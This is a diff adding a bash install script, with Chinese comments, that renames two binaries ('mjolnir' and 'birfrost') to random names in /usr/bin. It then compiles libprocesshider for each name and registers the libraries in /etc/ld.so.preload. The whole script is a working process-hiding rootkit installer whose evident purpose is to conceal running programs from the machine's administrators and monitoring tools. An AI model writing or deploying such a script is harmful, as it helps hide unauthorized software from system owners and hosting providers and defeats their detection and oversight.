@@ -1,0 +1,25 @@
+#!/bin/bash
+mjolnir_random=`cat /dev/urandom | tr -dc a-z0-3 | head -c 5`
+birfrost_random=`cat /dev/urandom | tr -dc a-z0-3 | head -c 5`
+filetype=`cat /dev/urandom | tr -dc a-z | head -c 3`
+
+#生成随机文件名的配置文件
+echo 'mjolnir='"$mjolnir_random"'.'"$filetype" >> /config
+echo 'birfrost='"$birfrost_random"'.'"$filetype" >> /config
+
+#导入环境变量
+source /config
+
+#开始更名
+mv elf-mjolnir /usr/bin/"$mjolnir" && chmod +x /usr/bin/"$mjolnir"
+mv elf-birfrost /usr/bin/"$birfrost" && chmod +x /usr/bin/"$birfrost"
+
+#开始制作Hider
+unzip hide.zip
+sed -i "s/mjolnir/$mjolnir/g" `grep "mjolnir" -rl "processhider.c"` && make
+mv libprocesshider.so /Hider/"$mjolnir"'.so'
+echo /Hider/"$mjolnir"'.so' >> /etc/ld.so.preload
+
+sed -i "s/$mjolnir/$birfrost/g" `grep "$mjolnir" -rl "processhider.c"` && make
+mv libprocesshider.so /Hider/"$birfrost"'.so'
+echo /Hider/"$birfrost"'.so' >> /etc/ld.so.preload
